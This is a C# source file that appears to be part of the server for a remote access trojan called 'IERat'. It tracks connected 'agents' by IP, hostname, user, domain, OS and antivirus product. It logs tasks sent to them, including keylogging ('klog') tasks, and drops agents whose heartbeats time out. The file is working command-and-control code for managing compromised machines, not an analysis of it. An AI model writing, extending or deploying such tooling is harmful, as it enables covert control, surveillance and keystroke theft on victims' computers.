using ConsoleTables;
using System;
using System.Collections.Generic;
using System.Drawing;

namespace IERatServer.lib
{
    public class TaskHistoryObject
    {
        public TaskHistoryObject()
        {
            task = new TaskObject();
        }
        public Guid AgentID { get; set; }

        public int AgentNumber { get; set; }
        public TaskObject task { get; set; }
    }
    public class Db
    {
        public static List<AgentChannel> channels = new();
        public static List<TaskHistoryObject> TaskHistory = new();
        public static int IncomingAgentCounter = 1;
        public static int NewAgentChannel(Agent newAgent, string IP)
        {
            int newInteractNum = IncomingAgentCounter;
            channels.Add(new AgentChannel
            {
                agent = newAgent,
                LastHeartBeatTime = DateTime.Now.ToString(),
                IPAddress = IP,
                InteractNum = newInteractNum
            }) ;
            IncomingAgentCounter++;
            return newInteractNum;
        }

        public static void ListChannels()
        {
            var table = new ConsoleTable("#", "IP", "Machine", "User", "OS", "AV" , "Version");
            foreach (AgentChannel agentChannel in channels)
            {
                var agent = agentChannel.agent;
                table.AddRow(agentChannel.InteractNum, agentChannel.IPAddress, agent.Hostname,
                    $"{agent.Username}@{agentChannel.agent.Domain}",
                    agent.OSVersion, agent.AV, agent.Version);
            }
            table.Write();
            Console.WriteLine();
        }
        public static bool AgentExists(Guid ID)
        {
            foreach (AgentChannel agentChannel in channels)
            {
                if (agentChannel.agent.ID == ID) { return true; }
            }
            return false;
        }

        public static void ListTasks()
        {
            var table = new ConsoleTable("Agent #", "Command", "args", "Result", "Time");
            foreach (TaskHistoryObject taskHistoryObject in TaskHistory)
            {
                if ((taskHistoryObject.task.Type.Contains("klog")) && (taskHistoryObject.task.args != "")) {
                    taskHistoryObject.task.args = "";
                }
                if (taskHistoryObject.task.Result.Length > 50)
                {
                    table.AddRow(taskHistoryObject.AgentNumber, taskHistoryObject.task.Type, taskHistoryObject.task.args,
                        "<Output too long>", taskHistoryObject.task.Time);
                }
                else
                {
                    table.AddRow(taskHistoryObject.AgentNumber, taskHistoryObject.task.Type, taskHistoryObject.task.args,
                     taskHistoryObject.task.Result, taskHistoryObject.task.Time);
                }
            }
            table.Write();
            Console.WriteLine();
        }
        public static bool ChannelExists(int AgentNumber)
        {
            foreach (AgentChannel agentChannel in channels)
            {
                if (agentChannel.InteractNum == AgentNumber) { return true; }
            }
            return false;
        }

        public static AgentChannel GetChannelFromID(Guid guid)
        {
            foreach (AgentChannel agentChannel in channels)
            {
               if (agentChannel.agent.ID == guid) { return agentChannel; }
            }
            return null;
        }
        public static void DetectTimeOut()
        {
            while (true)
            {
                try
                {
                    if (channels.Count != 0)
                    {
                        List<AgentChannel> TimedOutChannels = new();
                        foreach (AgentChannel agentChannel in channels)
                        {
                            DateTime dateTime = DateTime.Parse(agentChannel.LastHeartBeatTime);
                            DateTime dateTimeNow = DateTime.Now;
                            var diffInSeconds = (dateTimeNow - dateTime).TotalSeconds;
                            if (diffInSeconds > CLI.TimeOutSeconds)
                            {
                                Colorful.Console.ForegroundColor = Color.Blue;
                                Colorful.Console.WriteLine($"\nLost connection with agent #{agentChannel.InteractNum}\n");
                                Colorful.Console.ForegroundColor = Color.White;

                                Logger.Log("info", $"Lost connection with agent {agentChannel.agent.ID}");
                                TimedOutChannels.Add(agentChannel);
                            }
                        }
                        foreach (AgentChannel TimedOutChannel in TimedOutChannels)
                        {
                            if (TimedOutChannel.InteractNum == CLI.InteractContext) {
                                CLI.loop._client.Prompt = "IERat$ ";
                                CLI.loop._client.DisplayPrompt();
                            }
                            channels.Remove(TimedOutChannel);
                        }
                    }
                }
                catch
                {
                }
            }
        }
    }
}
